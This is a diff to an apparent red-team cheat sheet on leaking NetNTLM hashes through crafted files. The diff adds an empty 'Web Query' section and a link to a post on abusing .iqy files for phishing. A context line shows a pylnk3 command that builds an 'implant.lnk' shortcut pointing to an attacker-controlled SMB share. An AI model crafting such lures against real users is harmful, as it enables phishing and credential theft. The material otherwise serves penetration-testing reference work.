@@ -130,6 +130,12 @@ TODO: Show it step by step.
 $ pylnk3 c \\<attacker_IP>\<share_name>\file.ext implant.lnk
 ```
 
+## 04 - Web Query
+
+```
+
+```
+
 ## 04 - Internet Shortcut File
 
 SMB link and name it with `.url` extension.
@@ -217,6 +223,10 @@ Name it with `.asx` extension.
 ### Securify
 
 - [Securify: Living off the Land Stealing NetNTLM Hashes](https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes/)
+
+### Lab of a Penetration Tester
+
+- [Lab of a Penetration Tester: Abusing Web Query (`.iqy`) files for effective phishing](https://www.labofapenetrationtester.com/2015/08/abusing-web-query-iqy-files.html)
 
 ### Bohops
 
